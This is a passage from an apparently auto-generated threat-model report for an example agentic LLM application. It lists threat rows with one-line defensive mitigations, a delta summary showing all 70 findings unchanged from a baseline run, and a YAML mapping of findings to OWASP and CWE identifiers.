| AGP-01 | [UNCHANGED] | LLM Agent Orchestrator | Multi-agent emergent behavior — cascading failures or feedback amplification bypassing per-agent safety evaluation | Medium | Fail-safe shutdown circuits; bounded action scopes; behavioral baselining of collective agent system |
| R-1 | [UNCHANGED] | User | User denies submitting specific prompt; no non-repudiation controls | Medium | Request signing at client layer; log signed request hash |
| R-2 | [UNCHANGED] | Guardrails Service | Guardrails denies filtering decisions without tamper-evident logs | Medium | Log all filtering decisions (pass and reject) atomically with monotonic sequence numbers |
| I-1 | [UNCHANGED] | Guardrails Service | Rejection reasons reveal filtering rules to iterative probers | Medium | Generic rejection messages externally; detailed reason logged internally only |
| D-6 | [UNCHANGED] | Knowledge Base | High-volume complex vector search queries degrade retrieval performance | Medium | Per-session query rate limits; complexity bounds; result caching |
| D-8 | [UNCHANGED] | Long-Running Learning Loop | Training signal flooding causes runaway Learning Loop processing | Medium | Training run scheduling with resource quotas; volume limits per run |
| R-5 | [UNCHANGED] | Inter-Agent Communication Channel | Channel denies delivery/modification of specific message without delivery receipts | Low | Message delivery ACKs with content hash; ACK records in Audit Logger |
| R-8 | [UNCHANGED] | External API | External API provider denies returned specific response | Low | Log all External API responses with content hash immediately upon receipt |

---

## 8. Delta Summary

**Baseline**: `/Users/david/Projects/tachi/examples/agentic-app/test-output/2026-04-19T02-53-49/threats.md` (schema 1.4, run `2026-04-19T02-53-49`)

| Status | Count |
|---|---|
| NEW | 0 |
| UNCHANGED | 70 |
| UPDATED | 0 |
| RESOLVED | 0 |
| **Total** | **70** |

All 70 findings carried forward as UNCHANGED. Cross-schema baseline comparison (1.4 → 1.6): schema bump is additive only (OI prefix regex extension, no category or finding-shape changes). No delta generated by schema evolution. Architecture and component inventory unchanged between runs.

**Finding-level changes**:

No RESOLVED findings. No NEW findings. No UPDATED findings. All 70 findings UNCHANGED.

---

## 9. Source Attribution

```yaml
OI-1:
  source_attribution:
    - taxonomy: owasp
      id: LLM05
      relationship: primary
    - taxonomy: cwe
      id: CWE-79
      relationship: related

OI-2:
  source_attribution:
    - taxonomy: owasp
      id: LLM05
      relationship: primary
    - taxonomy: cwe
      id: CWE-89
      relationship: related
    - taxonomy: cwe
      id: CWE-78
      relationship: related

OI-3:
  source_attribution:
    - taxonomy: owasp
      id: LLM05
      relationship: primary
    - taxonomy: cwe
      id: CWE-918
      relationship: related
```
